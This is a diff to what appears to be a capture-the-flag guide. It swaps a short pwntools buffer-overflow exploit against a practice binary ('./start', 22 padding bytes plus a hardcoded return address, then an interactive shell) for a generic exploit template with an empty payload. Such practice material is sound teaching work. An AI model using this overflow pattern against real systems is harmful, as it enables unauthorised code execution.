@@ -1142,21 +1142,40 @@ s.close()
 ```python
 from pwn import *
 
-elf = ELF("./start")
+context.log_level = "DEBUG"
+context.terminal = ["tmux", "split-window", "-h"]
 
-if args.REMOTE:
-    host = "localhost"
-    port = 5700
+elf = ELF("./chal", checksec=False)
 
-    io = remote(host, port)
-else:
-    io = elf.process()
 
-shell_address = 0x565561BD
+def conn() -> pwnlib.tubes:
+    if args.REMOTE:
+        io = remote("localhost", 1337)
 
-io.sendline(b"A" * 22 + p32(shell_address))
-io.clean()
-io.interactive()
+    elif args.GDB:
+        gdbscript = """
+        c
+        """
+        pty = process.PTY
+        io = gdb.debug([elf.path], gdbscript=gdbscript, stdin=pty, stdout=pty)
+    else:
+        pty = process.PTY
+        io = elf.process(stdin=pty, stdout=pty)
+
+    return io
+
+
+def main():
+    payload = b""
+
+    io = conn()
+    io.sendlineafter(b"", payload)
+
+    io.interactive("")
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 </details>
